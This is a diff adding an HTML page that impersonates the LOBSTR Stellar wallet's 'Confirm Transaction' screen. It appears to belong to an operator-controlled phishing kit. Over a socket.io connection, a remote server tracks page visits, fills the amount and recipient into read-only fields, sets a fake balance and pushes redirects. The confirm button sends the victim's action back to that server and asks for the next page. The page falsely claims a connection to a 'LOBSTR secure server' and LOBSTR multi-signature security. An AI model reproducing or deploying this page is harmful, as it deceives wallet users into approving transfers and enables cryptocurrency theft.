@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="/socket.io/socket.io.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOBSTR - Confirm</title>
+    <link rel="icon" href="https://static.lobstr.co/static/landing/images/logo.svg">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --lobstr-teal: #1B8DA0;
+            --lobstr-light-teal: #E8F4F6;
+            --lobstr-dark-teal: #156B7D;
+            --lobstr-white: #FFFFFF;
+            --lobstr-gray: #F8F9FA;
+            --lobstr-text: #333333;
+            --lobstr-light-gray: #E9ECEF;
+            --spacing-1: 8px;
+            --spacing-2: 16px;
+            --spacing-3: 24px;
+            --spacing-4: 32px;
+            --spacing-5: 40px;
+            --border-radius: 8px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Ubuntu', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
+            background-color: var(--lobstr-white);
+            color: var(--lobstr-text);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: var(--spacing-3);
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: var(--spacing-5);
+        }
+
+        .logo {
+            height: 48px;
+            margin-bottom: var(--spacing-2);
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 500;
+            color: var(--lobstr-text);
+            margin-bottom: var(--spacing-1);
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+        }
+
+        .card {
+            background: var(--lobstr-white);
+            border: 1px solid var(--lobstr-light-gray);
+            border-radius: var(--border-radius);
+            padding: var(--spacing-4);
+            margin-bottom: var(--spacing-3);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .balance-section {
+            text-align: center;
+            margin-bottom: var(--spacing-4);
+        }
+
+        .balance-label {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: var(--spacing-1);
+        }
+
+        .balance-amount {
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--lobstr-teal);
+            margin-bottom: var(--spacing-2);
+        }
+
+        .balance-usd {
+            font-size: 16px;
+            color: #666;
+        }
+
+        .input-group {
+            margin-bottom: var(--spacing-3);
+        }
+
+        .input-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--lobstr-text);
+            margin-bottom: var(--spacing-1);
+        }
+
+        .input-field {
+            width: 100%;
+            padding: var(--spacing-2);
+            border: 1px solid var(--lobstr-light-gray);
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            font-family: 'Ubuntu', sans-serif;
+            transition: border-color 0.3s ease;
+            background: var(--lobstr-white);
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--lobstr-teal);
+            box-shadow: 0 0 0 3px rgba(27, 141, 160, 0.1);
+        }
+
+        .input-interactable-area {
+            cursor: pointer;
+            position: relative;
+        }
+
+        .input-interactable-area:hover .input-field {
+            border-color: var(--lobstr-teal);
+        }
+
+        .submit-button {
+            width: 100%;
+            background: var(--lobstr-teal);
+            color: var(--lobstr-white);
+            border: none;
+            border-radius: var(--border-radius);
+            padding: var(--spacing-2) var(--spacing-3);
+            font-size: 16px;
+            font-weight: 500;
+            font-family: 'Ubuntu', sans-serif;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: var(--spacing-2);
+        }
+
+        .submit-button:hover {
+            background: var(--lobstr-dark-teal);
+        }
+
+        .submit-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin-top: var(--spacing-2);
+        }
+
+        .security-notice {
+            background: var(--lobstr-light-teal);
+            border: 1px solid var(--lobstr-teal);
+            border-radius: var(--border-radius);
+            padding: var(--spacing-2);
+            margin-top: var(--spacing-3);
+            text-align: center;
+        }
+
+        .security-notice-text {
+            font-size: 12px;
+            color: var(--lobstr-dark-teal);
+            font-weight: 500;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: var(--spacing-2);
+        }
+
+        .loading-spinner {
+            border: 2px solid var(--lobstr-light-gray);
+            border-top: 2px solid var(--lobstr-teal);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: var(--spacing-1);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .error-message {
+            background: #fee;
+            border: 1px solid #fcc;
+            color: #c33;
+            padding: var(--spacing-2);
+            border-radius: var(--border-radius);
+            margin-top: var(--spacing-2);
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: var(--spacing-2);
+            }
+            
+            .card {
+                padding: var(--spacing-3);
+            }
+            
+            .balance-amount {
+                font-size: 28px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://static.lobstr.co/static/landing/images/logo.svg" alt="LOBSTR" class="logo">
+            <h1 class="title">Confirm Transaction</h1>
+            <p class="subtitle">Review your transaction details</p>
+        </div>
+
+        <div class="card">
+            <div class="balance-section">
+                <div class="balance-label">Available Balance</div>
+                <div class="balance-amount">$2,450.75</div>
+                <div class="balance-usd">≈ 1,234.56 XLM</div>
+            </div>
+
+            <form id="transactionForm">
+                <div class="input-group">
+                    <label class="input-label" for="amount">Amount to Send</label>
+                    <div class="input-interactable-area" data-testid="input-interactable-area">
+                        <input type="text" id="amount" class="input-field" placeholder="Enter amount" readonly>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label" for="recipient">Recipient Address</label>
+                    <div class="input-interactable-area" data-testid="input-interactable-area">
+                        <input type="text" id="recipient" class="input-field" placeholder="Stellar address" readonly>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label" for="memo">Memo (Optional)</label>
+                    <div class="input-interactable-area" data-testid="input-interactable-area">
+                        <input type="text" id="memo" class="input-field" placeholder="Transaction memo" readonly>
+                    </div>
+                </div>
+
+                <button type="submit" id="submitBtn" class="submit-button">
+                    Confirm Transaction
+                </button>
+
+                <div class="loading" id="loading">
+                    <div class="loading-spinner"></div>
+                    Processing transaction...
+                </div>
+
+                <div class="error-message" id="errorMessage">
+                    Transaction failed. Please try again.
+                </div>
+            </form>
+
+            <div class="info-text">
+                Transaction fees: 0.00001 XLM
+            </div>
+
+            <div class="security-notice">
+                <div class="security-notice-text">
+                    🔒 Secured by LOBSTR multi-signature technology
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="/js/socket-client.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Apply custom LOBSTR styling
+            const style = document.createElement('style');
+            style.textContent = `
+                body { 
+                    font-family: 'Ubuntu', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif !important;
+                    background: #ffffff !important;
+                }
+            `;
+            document.head.appendChild(style);
+
+            // Socket connection for real-time updates
+            socket.emit('page_visit', {
+                page: window.location.pathname
+            });
+
+            // Make input fields interactive
+            document.querySelectorAll('[data-testid="input-interactable-area"]').forEach(option => {
+                option.addEventListener('click', function() {
+                    document.querySelectorAll('[data-testid="input-interactable-area"]').forEach(el => {
+                        el.classList.remove('selected');
+                    });
+                    this.classList.add('selected');
+                });
+            });
+
+            // Handle form submission
+            const submitBtn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            const errorMessage = document.getElementById('errorMessage');
+
+            submitBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // Hide error message
+                errorMessage.style.display = 'none';
+                
+                // Show loading state
+                submitBtn.style.display = 'none';
+                loading.style.display = 'block';
+
+                // Emit socket events for transaction confirmation
+                socket.emit('amount_confirmed', {
+                    amount: document.getElementById('amount').value,
+                    recipient: document.getElementById('recipient').value,
+                    page: window.location.pathname
+                });
+
+                // Simulate processing delay then redirect
+                setTimeout(() => {
+                    socket.emit('page_loading', true);
+                    
+                    // Redirect to lobstr loading page
+                    socket.emit('request_redirect', { page: 'lobstrLoading' });
+                }, 2000);
+            });
+
+            // Socket event handlers
+            socket.on('connect', () => {
+                console.log('Connected to LOBSTR secure server');
+            });
+
+            socket.on('connect_error', (error) => {
+                console.error('Connection error:', error);
+                errorMessage.style.display = 'block';
+                errorMessage.textContent = 'Connection error. Please check your network.';
+            });
+
+            socket.on('redirect', (url) => {
+                // Update URL to use lobstr prefixed pages
+                window.location.href = url;
+            });
+
+            socket.on('session_url', (url) => {
+                if (url && url !== window.location.pathname + window.location.search) {
+                    window.history.replaceState({}, '', url);
+                }
+            });
+
+            socket.on('transaction_error', (error) => {
+                loading.style.display = 'none';
+                submitBtn.style.display = 'block';
+                errorMessage.style.display = 'block';
+                errorMessage.textContent = error.message || 'Transaction failed. Please try again.';
+            });
+
+            socket.on('balance_update', (data) => {
+                if (data.balance) {
+                    document.querySelector('.balance-amount').textContent = '$' + data.balance.toLocaleString();
+                }
+                if (data.xlm_amount) {
+                    document.querySelector('.balance-usd').textContent = '≈ ' + data.xlm_amount.toLocaleString() + ' XLM';
+                }
+            });
+
+            // Auto-populate form fields if data is available
+            socket.on('transaction_data', (data) => {
+                if (data.amount) {
+                    document.getElementById('amount').value = data.amount;
+                }
+                if (data.recipient) {
+                    document.getElementById('recipient').value = data.recipient;
+                }
+                if (data.memo) {
+                    document.getElementById('memo').value = data.memo;
+                }
+            });
+
+            // Request initial transaction data
+            socket.emit('request_transaction_data');
+        });
+    </script>
+</body>
+</html>
